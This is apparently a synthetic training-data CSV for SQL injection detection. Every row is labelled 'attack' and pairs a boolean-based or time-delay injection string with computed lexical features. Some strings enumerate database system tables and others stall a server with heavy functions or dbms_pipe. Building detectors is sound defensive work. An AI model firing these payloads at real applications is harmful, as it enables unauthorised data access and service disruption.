id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_001822,attack,boolean,"1%'  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  '%'  =  '",nearest_attack_euclidean,R000061,1.7037404383029988,181.76418911913518,31.73219039517225,3.721195662764908,50.928761580689,23.513523586723686,73.857523161378,33.4643807903445,0.28164821827761144,0.1281372131950253,0.4038280685218914,0.18638650000547186,2.7321903951722497,1.2678096048277507,0.0,0.0,0.0,2.0,0.0,15.4643807903445,2.0,1.3169524012069376,2.3660951975861244,8.0,0.6830475987930624,0.31695240120693774,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,3.4152379939653117,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.415237993965311
SMOTE_001823,attack,boolean,"1' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'adsh'  =  'adsh",nearest_attack_euclidean,R000016,0.06640437507601746,254.32841574517073,36.01918812156655,3.7974794014919624,81.71217817650175,29.05756436469965,99.75055441963485,43.808118784334496,0.3212419847398208,0.11433431116556969,0.3922201390818148,0.1722035650127947,3.9616237568668997,0.0,0.0,0.0,0.0,2.0,0.0,21.9232475137338,0.0,1.9808118784334496,3.9808118784334496,11.9616237568669,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.019188121566550143,0.0,0.019188121566550143,0.0,0.9808118784334499,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,6.961623756866901,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.98081187843345
SMOTE_001824,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and   (  ""yobb"" like ""yobb",nearest_attack_euclidean,R000039,0.49063521795811926,131.016310650213,29.387752048117886,4.243887859307475,82.37144139790487,4.465302457741462,29.326512288707313,14.85305450585935,0.632185338620247,0.0336063403074667,0.22158938222993213,0.11261893884235429,0.23265122887073142,2.7673487711292686,0.0,0.0,0.9224495903764229,0.0,0.0,3.6979536866121947,0.0,0.15510081924715446,2.8448991807528454,1.3877520481178856,0.07755040962357718,0.9224495903764228,0.0,0.0,3.469446951953614e-18,-1.1102230246251565e-16,1.0,0.0,0.0,3.469446951953614e-18,0.07755040962357718,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001825,attack,boolean,"1 where 7522  =  7522 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",nearest_attack_euclidean,R000062,3.5694398079418104,230.9235308007921,34.2219607313984,3.9241900112625987,60.72078402269118,59.75411848047526,84.42000067467045,26.028627622955213,0.2895436187785774,0.23955273203788846,0.3588128001482196,0.11209084903531448,0.0,0.30549018284959906,2.0,0.0,1.694509817150401,2.0,0.0,14.334117805804812,0.0,0.0,4.778039268601603,5.694509817150401,0.0,0.30549018284959906,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,0.6945098171504009,0.0,3.0835294514512026,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.6945098171504009,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.778039268601604
SMOTE_001826,attack,boolean,"1   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000042,0.4844533948141231,129.0,29.0,3.958040711177315,66.28846756116998,7.728743671332637,40.05060284966423,14.93218591783316,0.5138640896214727,0.059912741638237496,0.3104697895322808,0.11575337920800899,0.0,0.20344224650052245,1.8643718356663186,0.0,1.0,0.9321859178331592,0.0,5.796557753499477,0.0,0.0,2.0678140821668407,3.7965577534994774,0.0,0.06781408216684087,0.9321859178331593,0.0,3.469446951953614e-18,0.9321859178331592,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001827,attack,boolean,"1""  )   where 3393  =  3393 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000040,1.2446025022171014,133.55882911272172,31.062092123635747,4.131442036448597,67.43682020605958,13.498912329695326,37.87364041211916,14.749456164847665,0.5079895444263725,0.09919805786976048,0.2827400456153907,0.11007235208847646,0.0,1.0,1.3747280824238313,0.0,1.0,1.6873640412119157,0.0,4.687364041211915,0.0,0.0,2.0,4.062092123635747,0.0,1.0,0.6873640412119157,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.6873640412119156,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.687364041211916
SMOTE_001828,attack,boolean,"1'+  (  select pwvr where 3028  =  3028 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000074,0.7436802850245651,143.60722969035237,39.02228886611786,4.038883396110792,50.725603813763676,21.85933701047084,52.34819257741191,18.674096288705954,0.35092277959906354,0.1531463267650668,0.36549270361053454,0.13043819002533516,2.6740962887059534,0.0,2.0,0.8370481443529767,0.16295185564702333,2.0,0.0,8.51114443305893,0.0,0.0,1.1629518556470233,5.837048144352977,1.0,0.0,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,1.0,0.1629518556470233,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.1629518556470235
SMOTE_001829,attack,boolean,"-9133""   )    )    or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   ""crfy""  =  ""crfy",nearest_attack_euclidean,R000078,1.4835922374584762,376.8420355732752,35.49721707928754,3.5049435692406994,96.4916512378626,48.42936654877499,168.71190035367502,63.20911743296257,0.2555128570206692,0.12884380713171273,0.44822737070031143,0.1674159651473066,0.0,4.0,1.0,0.0,0.0,2.785316725612505,0.0,34.0,0.4293665487749898,2.3559501768375144,0.0,21.638483981737558,0.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.7853167256125049,1.0,0.0,0.0,0.7853167256125051,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,2.5761992926499397,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,8.361516018262446
SMOTE_001830,attack,boolean,"1""   )    )    as ogzn where 6849  =  6849 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000024,5.712825358247603,209.33782232062524,35.044273435404754,4.003580894878249,65.24350389472613,46.80269339237514,73.9355136985894,23.356111334934553,0.34621935599459047,0.19861915576996844,0.3444014504179258,0.11076003781751528,0.0,0.5110683588511882,2.0,0.0,1.4889316411488118,2.0,0.0,11.867179693785742,0.0,0.0,3.9557265645952473,5.488931641148811,0.0,0.5110683588511882,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,0.48893164114881177,0.0,2.4667949234464355,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.48893164114881177,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.955726564595247
SMOTE_001831,attack,boolean,1'   )    )     )   and   (  1685  =  2985  )  *2985 and    (    (     (  'rzwb'  =  'rzwb,nearest_attack_euclidean,R000015,1.7184855931348761,72.98755245312664,17.36418773587756,2.82896175051919,10.40121301893064,11.69135018870205,38.83945132091435,12.055537924579612,0.13049223314619424,0.17467348979313976,0.5310374564714071,0.16379682058925887,2.6913501887020503,0.0,0.654324905648975,0.0,0.6728375471755125,1.6728375471755126,0.0,6.364187735877562,0.0,0.0,0.0,3.0,0.6728375471755125,0.0,0.32716245282448764,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.6728375471755128,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.6728375471755124
SMOTE_001832,attack,boolean,"1""  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and   (  ""xhqc""  =  ""xhqc",nearest_attack_euclidean,R000068,2.7682797286726863,369.17817218023913,37.61846969364383,3.569979772868135,110.22014875670237,39.779851243297635,163.97481405412205,55.20335812611706,0.2989159963470441,0.10751180390482971,0.4439522627395477,0.1496199370085786,0.0,4.0,0.0,0.0,0.0,2.3983209369414697,0.0,34.79664187388294,0.0,1.20335812611706,2.8050371891755903,12.39832093694147,0.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.6016790630585301,1.39832093694147,0.0,0.0,0.6016790630585301,1.39832093694147,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.39832093694146986,3.469446951953614e-18,0.0,0.0,0.0,8.99160468470735,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,14.788246558590288
SMOTE_001833,attack,boolean,"1'+  (  select zukr where 9215  =  9215 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   +'",nearest_attack_euclidean,R000033,2.0424360164776645,205.52667574766056,35.599355717515536,3.8132964295774467,61.39742287006216,28.264948580041438,81.86430429755697,34.0,0.2982238036633097,0.1368310501126498,0.39856484260259895,0.16638030362144157,2.9337628549896406,0.0,0.0,0.0,0.0,2.0,0.0,17.06623714501036,0.9337628549896408,1.0,3.0,9.066237145010358,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.5331185725051796,0.0,0.5331185725051796,0.0,0.4668814274948205,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,5.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.533118572505179
SMOTE_001834,attack,boolean,"1   )    )    as dnwj where 2961  =  2961 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000018,0.7854131076596427,272.8338306063244,38.0,3.8040676613623194,82.76676612126488,35.46646775747025,110.60059672758925,44.0,0.30336588577458623,0.13002507386543152,0.40532893489608884,0.1612801054638934,0.23323387873512536,0.0,2.0,0.0,0.0,2.0,0.0,23.766766121264872,0.0,2.0,4.0,14.0,0.2332338787351252,0.0,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,1.0,0.0,0.7667661212648748,0.23323387873512524,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
SMOTE_001835,attack,boolean,"1""   )    )    as wnzf where 3352  =  3352 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000030,0.6068502793120298,274.59490326860464,38.799271895514956,3.802013369645901,82.0,37.0,110.79563137308972,44.79927189551495,0.2986533313395616,0.13475821048248515,0.40343953845279135,0.16314891972516185,0.20072810448504574,0.7992718955149541,2.0,0.0,0.0,2.0,0.0,23.799271895514956,0.0,2.0,4.0,14.0,0.20072810448504586,0.7992718955149543,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
SMOTE_001836,attack,boolean,"1""   )    )    as ogzn where 6849  =  6849 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000024,1.5535797580422313,145.69467988568388,33.605428933981756,4.083314037881352,71.33246478422491,12.60542893398176,45.605428933981756,16.15135723349544,0.4907140498771251,0.08461107317231752,0.3133950768899327,0.11127980006062475,0.0,0.5756786167477197,2.0,0.0,1.0,1.5756786167477197,0.0,6.0,0.0,0.0,2.0,4.5756786167477195,0.0,0.5756786167477196,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.5756786167477197,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.5756786167477195
SMOTE_001837,attack,boolean,"1%"" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and ""%""  =  """,nearest_attack_euclidean,R000043,1.870630377131297,152.81427790787848,30.586252632818724,3.7894402956122155,44.75875789845617,18.538004212509957,59.614012637529875,29.903503159382467,0.2931302504619865,0.12060924861404057,0.38862290956638584,0.19763759135758707,1.269002106254979,2.7309978937450214,0.0,0.0,0.0,2.0,0.0,11.903503159382469,2.0,1.6827494734362551,1.6345010531274895,8.0,0.31725052656374475,0.6827494734362554,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,0.0,0.0,1.6827494734362554,0.3172505265637447,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,1.5862526328187236,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.5862526328187236
SMOTE_001838,attack,boolean,"1%' or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and '%'  =  '",nearest_attack_euclidean,R000007,1.2524033100743015,120.35637300826818,32.160906747932955,3.6335573164074635,34.0,14.440604498621967,51.6360707589572,20.279697750689017,0.28303738936718226,0.12053303725003295,0.42776879178434507,0.16866078159843975,5.440604498621968,0.0,0.0,0.7203022493109842,0.2796977506890158,2.0,0.0,8.559395501378031,2.0,0.2796977506890158,1.0,3.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.2796977506890158,0.0,0.0,0.2796977506890158,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.5593955013780314
SMOTE_001839,attack,boolean,""" or isNULL  (  1/0  )   /*",nearest_attack_euclidean,R000003,1.9016560029847607,26.211045693898996,14.605522846949498,3.209206987607191,7.802761423474749,2.0,10.013807117373752,6.394477153050502,0.29788436857105677,0.07661498971369082,0.3785044920067667,0.2469961497084856,0.9861928826262552,0.802761423474749,0.0,1.802761423474749,1.0,0.1972385765252509,0.0,1.6055228469494978,0.0,0.0,0.0,3.0,0.197238576525251,0.8027614234747491,0.0,0.0,1.0,0.197238576525251,0.802761423474749,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_001840,attack,boolean,"1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",nearest_attack_euclidean,R000029,0.3575526875580847,174.72234847918912,36.1292759322921,3.9364521971183555,53.068414916673575,25.034207458336788,66.10262237501036,30.517103729168394,0.3036973466872975,0.14319292449946,0.3776442804332475,0.17546544837999503,3.741448135415803,0.0,0.0,0.0,0.0,2.0,0.0,12.77565559375259,0.0,1.8707240677079016,1.2585518645841967,10.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.6463796614604915,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.6463796614604913
SMOTE_001841,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (     (  ""dskh""  =  ""dskh",nearest_attack_euclidean,R000076,0.42651498126495935,139.71530235477374,30.905100784924578,4.10747546334887,79.14590706432121,4.379596860301685,39.189798430150844,17.0,0.5663817935674176,0.031401582430820724,0.2805357136801326,0.12168091032162912,0.0,2.8102015698491574,0.18979843015084275,0.0,1.0,0.9999999999999999,0.0,5.094899215075421,0.0948992150754214,0.0,2.9051007849245787,2.1897984301508435,0.0,1.0,0.09489921507542148,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,0.9051007849245786,0.09489921507542143,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001842,attack,boolean,"1'+  (  select pwvr where 3028  =  3028 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000074,0.3936807424922479,140.59784463044974,39.73189642029983,4.0076978663890355,45.59784463044976,23.0,53.13405178985008,18.865948210149917,0.32427768732103646,0.16359592833280173,0.3779533115918915,0.13417307275427037,3.0,0.0,2.0,1.0,0.0,2.0,0.0,9.0,0.0,0.0,1.0,5.865948210149917,1.0,0.0,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.8659482101499175,0.0,1.0,0.0,0.13405178985008248,0.8659482101499175,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.8659482101499174
SMOTE_001843,attack,boolean,"1  )   as ooex where 1087  =  1087 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R000034,0.43911304025374387,221.1249942498975,33.920454022717955,3.7741962111264185,65.99147557383336,35.46022701135898,86.1420431022308,33.531248562474374,0.29845417170031213,0.1610953089982405,0.389438185411748,0.15101233388969929,0.0,0.0,2.0,0.0,0.0,2.0,0.0,18.150567528397445,0.0,1.2301135056794887,3.2301135056794887,10.920454022717955,0.0,0.0,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,5.4602270113589775,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.4602270113589775
SMOTE_001844,attack,boolean,"1' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  ",nearest_attack_euclidean,R000052,0.5599469805695468,172.48697354177543,32.15926594297101,3.7135423779033374,52.87596268634054,22.885138399202944,68.96477137068845,27.761101085543487,0.30741916511868494,0.13208478741040794,0.3995469807406567,0.16094906673025047,1.159265942971008,0.0,0.0,0.0,0.0,0.920367028514496,0.0,15.681468114057985,0.0,1.079632971485504,2.840734057028992,6.920367028514496,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.9203670285144961,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.07963297148550397,0.0,0.0,0.07963297148550391,0.07963297148550419,0.920367028514496,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,4.601835142572481,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.761101085543488
SMOTE_001845,attack,boolean,"1%'   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   '%'  =  '",nearest_attack_euclidean,R000025,1.852338425399267,99.39489659731912,25.96294044508897,3.3298562600947745,20.991696989731132,14.345686518303676,46.197448298659566,17.860064790624754,0.1809403749681882,0.16949180572117947,0.4601183878541426,0.1894494314564897,4.0,0.0,0.448562172767892,0.0,1.0,2.0,0.0,7.308626963392648,2.0,0.5514378272321079,0.5514378272321079,3.448562172767892,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.5514378272321079,0.0,0.0,0.5514378272321079,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.1028756544642158
SMOTE_001846,attack,boolean,1'   )    )     )   and   (  1685  =  2985  )  *2985 and    (    (     (  'rzwb'  =  'rzwb,nearest_attack_euclidean,R000015,2.0742482238768205,105.58750004182059,23.396474370769912,3.0912477668439706,21.993589765036205,12.999999999999998,53.195833347273535,17.39807692951086,0.1987250713408932,0.1269907406939132,0.5091666666018285,0.16511752136336508,4.0,0.0,0.0,0.0,1.0,2.0,0.0,8.79935897650362,0.7993589765036201,0.3996794882518101,0.3996794882518102,3.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.3996794882518101,0.0,0.0,0.3996794882518101,1.60032051174819,0.3996794882518101,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7993589765036204
SMOTE_001847,attack,boolean,"1""  )   as jidc where 6093  =  6093 and 9198  =  9198--",nearest_attack_euclidean,R000055,0.2299128604421051,57.34895386222912,22.62638769659443,3.734986036762704,14.156596924148609,17.62638769659443,18.939581544891645,6.626387696594435,0.24824090305375732,0.3076673006895581,0.3297131988179004,0.11437859743878417,0.0,1.0,2.0,0.0,0.0,2.0,0.0,1.3131938482972156,0.0,0.15659692414860815,0.15659692414860804,4.0,0.0,1.0,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
